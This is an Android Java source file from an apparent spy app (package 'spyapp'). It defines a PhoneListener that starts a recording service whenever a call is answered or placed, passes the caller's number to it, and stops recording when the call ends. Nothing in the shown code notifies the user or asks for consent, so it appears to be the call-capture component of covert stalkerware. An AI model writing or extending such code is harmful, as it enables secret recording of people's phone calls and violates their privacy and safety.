package com.app.spyapp.receiver;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.app.spyapp.common.WriteLog;
import com.app.spyapp.service.RecordService;

public class PhoneListener extends PhoneStateListener {
    private Context context;

    public PhoneListener(Context c) {
        WriteLog.E("Debug", "PhoneListener constructor");
        context = c;
    }

    public void onCallStateChanged(int state, String incomingNumber) {
        Log.i("Debug", "PhoneListener::onCallStateChanged state:" + state + " incomingNumber:" + incomingNumber);

//        if (spyApp.getSharedPreferences().getBoolean(Pref.RECORDCALL, false)) {
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:
                    Log.i("Debug", "CALL_STATE_IDLE, stoping recording");
                    Intent intent=new Intent(context, RecordService.class);

                    context.stopService(intent);
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    Log.i("Debug", "CALL_STATE_RINGING");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    Log.i("Debug", "CALL_STATE_OFFHOOK starting recording");
                    Intent callIntent = new Intent(context, RecordService.class);
                    callIntent.putExtra("INCOMINGNUMBER",incomingNumber);
                    ComponentName name = context.startService(callIntent);
                    if (null == name) {
                        Log.i("Debug", "startService for RecordService returned null ComponentName");
                    } else {
                        Log.i("Debug", "startService returned " + name.flattenToString());
                    }
                    break;
            }
        }

}
